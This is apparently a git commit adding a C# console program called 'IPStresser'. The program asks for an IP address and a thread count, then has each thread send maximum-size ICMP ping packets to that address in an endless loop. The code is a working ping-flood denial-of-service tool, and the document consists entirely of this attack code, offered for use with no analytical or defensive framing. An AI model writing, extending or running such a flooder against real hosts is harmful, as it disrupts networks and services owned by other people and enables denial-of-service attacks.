995f5cf81417a3eeb15dd4286ba329c7155e0de7
seanp97 <sean.pelser97@gmail.com>
2021-10-06 14:26:49 +0100

    Add files via upload

---
+++ IPStresser/IPPinger.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace IPNameSpace
+{
+    class IPPinger
+    {
+        public static string IPAddress { get; set; }
+        public void PingIP()
+        {
+            Console.WriteLine("How many threads? ");
+            int ThreadCount = Convert.ToInt32(Console.ReadLine());
+
+            Console.WriteLine("IP Address? ");
+            string ipAddress = Console.ReadLine();
+            IPAddress = ipAddress;
+
+            for (int i = 0; i < ThreadCount; i++)
+            {
+                new Thread(() =>
+                {
+                    PingMethod();
+                }).Start();
+            }
+        }
+
+        static void PingMethod()
+        {
+
+            try
+            {
+                while (true)
+                {
+                    Ping pinger = new Ping();
+                    byte[] packet = new byte[65500];
+                    PingReply reply = pinger.Send(IPAddress, 120, packet);
+                    Console.WriteLine(reply.Status);
+                }
+
+            }
+
+            catch (PingException pingEx)
+            {
+                Console.WriteLine(pingEx.ToString());
+            }
+
+        }
+
+
+        public void NumOfThreads()
+        {
+            int threadCount = Process.GetCurrentProcess().Threads.Count;
+            
+
+            while(true)
+            {
+                Console.WriteLine($"Number of threads: {threadCount}");
+                Thread.Sleep(10000);
+            }
+        }
+    }
+}
---
+++ IPStresser/Program.cs
@@ -0,0 +1,16 @@
+﻿using System;
+using IPNameSpace;
+
+namespace IPStresser
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.ForegroundColor = ConsoleColor.Blue;
+            IPPinger myPinger = new IPPinger();
+            myPinger.PingIP();
+            myPinger.NumOfThreads();
+        }
+    }
+}
